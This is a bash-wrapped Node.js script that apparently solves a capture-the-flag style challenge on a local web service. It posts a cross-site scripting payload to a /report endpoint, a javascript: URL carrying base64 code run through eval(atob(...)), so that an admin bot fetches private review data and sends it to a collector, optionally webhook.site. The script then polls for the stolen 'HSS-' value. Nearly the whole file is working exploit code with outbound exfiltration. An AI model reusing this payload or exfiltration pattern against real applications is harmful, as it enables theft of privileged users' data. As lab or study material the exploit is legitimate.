#!/usr/bin/env bash
set -euo pipefail

node <<'NODE'
const fs = require('node:fs');
const http = require('node:http');
const https = require('node:https');

const callbackBase = process.env.HSS_WEBHOOK_URL || 'http://127.0.0.1:1337/collect';
const collectionNonce = [...Array(24)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');

function form(fields) {
  return new URLSearchParams(fields).toString();
}

function request(method, path, { body = '' } = {}) {
  return new Promise((resolve, reject) => {
    const headers = {};
    if (body) {
      headers['content-type'] = 'application/x-www-form-urlencoded';
      headers['content-length'] = Buffer.byteLength(body);
    }
    const req = http.request({ hostname: '127.0.0.1', port: 1337, path, method, headers }, (res) => {
      let data = '';
      res.setEncoding('utf8');
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.end(body);
  });
}

function externalRequest(url) {
  return new Promise((resolve, reject) => {
    const client = url.startsWith('https:') ? https : http;
    const req = client.get(url, (res) => {
      let data = '';
      res.setEncoding('utf8');
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
  });
}

async function waitForService() {
  const deadline = Date.now() + 15000;
  while (Date.now() < deadline) {
    try {
      const res = await request('GET', '/');
      if (res.status === 200) return;
    } catch {}
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  throw new Error('service did not become ready');
}

async function main() {
  await waitForService();

  const js = callbackBase.startsWith('http://127.0.0.1:1337/collect')
    ? `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>fetch(${JSON.stringify(callbackBase)},{method:'POST',headers:{'Content-Type':'text/plain'},body:m.channel+':'+${JSON.stringify(collectionNonce)}+':'+t}))`
    : `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(m.channel+':'+${JSON.stringify(collectionNonce)}+':'+t))`;
  const encoded = Buffer.from(js).toString('base64');
  const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;

  await request('POST', '/report', {
    body: form({ parameters: payload }),
  });

  const deadline = Date.now() + 20000;
  while (Date.now() < deadline) {
    await new Promise((resolve) => setTimeout(resolve, 1000));
    if (callbackBase.startsWith('http://127.0.0.1:1337/collect')) {
      const res = await request('GET', '/collect');
      const items = JSON.parse(res.body).items || [];
      const found = items
        .filter((item) => item.nonce === collectionNonce)
        .map((item) => item.value)
        .find((value) => typeof value === 'string' && value.startsWith('HSS-'));
      if (found) {
        fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
        return;
      }
      continue;
    }

    const tokenMatch = callbackBase.match(/webhook\.site\/(?:#!\/)?(?:token\/)?([0-9a-f-]{36})/i);
    if (!tokenMatch) {
      throw new Error('set HSS_WEBHOOK_URL to a webhook.site URL or keep the local collector default');
    }
    const api = `https://webhook.site/token/${tokenMatch[1]}/requests?sorting=newest`;
    const res = await externalRequest(api);
    const data = JSON.parse(res.body);
    const requests = data.data || [];
    for (const item of requests) {
      const rawUrl = item.url || '';
      const encodedValue = rawUrl.includes('?') ? rawUrl.split('?').pop() : '';
      const decoded = Buffer.from(encodedValue, 'base64').toString('utf8');
      const [tag, nonce, ...rest] = decoded.split(':');
      const found = nonce === collectionNonce ? rest.join(':') : '';
      if (found.startsWith('HSS-')) {
        fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
      return;
      }
    }
  }
  throw new Error('timed out waiting for collected value');
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
NODE
